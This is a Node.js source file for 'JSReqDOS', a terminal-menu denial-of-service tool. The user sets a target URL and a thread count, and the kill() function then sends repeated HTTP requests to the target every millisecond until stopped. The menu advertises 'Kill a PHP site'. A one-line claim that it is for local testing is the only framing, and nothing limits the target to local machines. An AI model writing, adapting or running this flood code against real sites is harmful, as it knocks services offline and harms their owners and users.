let fetch = require('node-fetch')
let target = "https://example.com/"
let threads = 5
let worker = undefined
const CFonts = require('cfonts');
const { terminal } = require('terminal-kit');



var term = require( 'terminal-kit' ).terminal ;
term.cyan( 'JSReqDOS v1.1\n' ) ;
term.cyan( 'To be tested against local machines.\n' ) ;
term.green( `Current target:\n` ) ;
term.green( `Current threads:\n` ) ;
var items = [
	'a. Kill a PHP site' ,
    'b. Change target site' ,
    'c. Change threads amount' ,
    'd. Credits',
	'e. Close'
] ;
invokeMain()
function terminate() {
	term.grabInput( false ) ;
	setTimeout( function() { process.exit() } , 1 ) ;
}

term.on( 'key' , function( name , matches , data ) {
	if ( name === 'CTRL_C' ) { 
        try {
            clearInterval(worker)
        } catch (error) {
            
        }
        invokeMain(); 
    }
} ) ;
function invokeMain(){
    console.clear()
    CFonts.say('JSReqDOS', {
        font: 'simple3d',              // define the font face
        align: 'left',              // define text alignment
        colors: ['cyan'],         // define all colors
        background: 'transparent',  // define the background color, you can also use `backgroundColor` here as key
        letterSpacing: 1,           // define letter spacing
        lineHeight: 1,              // define the line height
        space: true,                // define if the output text should have empty lines on top and on the bottom
        maxLength: '0',             // define how many character can be on one line
        gradient: false,            // define your two gradient colors
        independentGradient: false, // define if you want to recalculate the gradient for each new line
        transitionGradient: false,  // define if this is a transition between colors directly
        env: 'node'                 // define the environment CFonts is being executed in
    });
    term.cyan('Current target: '+target+'\n')
    term.cyan('Current threads: '+threads+'\n')
    term.red('If you closed a DOS process, it will keep the active requests,\n please the software if you want immediate DoS closure.\n')
    
    term.cyan('\n<=== Menu ===>')
    term.singleColumnMenu( items , function( error , response ) {
        switch(response.selectedIndex){
            case 0:
                startDos()
                break;
            case 1:
                changeTarget()
                break;
            case 2:
                changeThreads()
                break;
            case 3:
                drawCredits()
                break;
            case 4:
                process.exit(1)
                break;

        }

    } ) ;
    
}

function kill(){
    console.clear()
    term.red('Started DOS..')
    worker = setInterval(()=>{
        for(let i =0;i<threads;i++){
            fetch(target).then(()=>{}).catch(()=>{})
        }
    },1)
    
}
function startDos(){
    term.red('Are you sure you want to DOS '+target+' with '+threads+' threads ?')
    term.singleColumnMenu( ['YES','NO'] , function( error , response ) {
        switch(response.selectedIndex){
            case 0:
                kill()
                break;
            case 1:
                invokeMain()
                break;

        }

    } ) ;
}
function changeTarget(){
    term.cyan( 'Input target: ' ) ;
    term.inputField(( error , input )=>{
            term.green( "\nChanged target to '%s'\n" , input ) ;
            target = input
            invokeMain()
        }
    ) ;
    
}

function changeThreads(){
    term.cyan( 'Input threads: ' ) ;
    term.inputField(( error , input )=>{
            term.green( "\nChanged threads to '%s'\n" , input ) ;
            threads = input
            invokeMain()
        }
    ) ;
    
}

function drawCredits(){
    console.clear()


    term.blue('De acord ? (y/n) ')
    term.inputField(( error , input )=>{
        if(input=='n'){
            term.red('xd')
        } else if(input=='y'){
            invokeMain()
        }
        
    }
) ;
}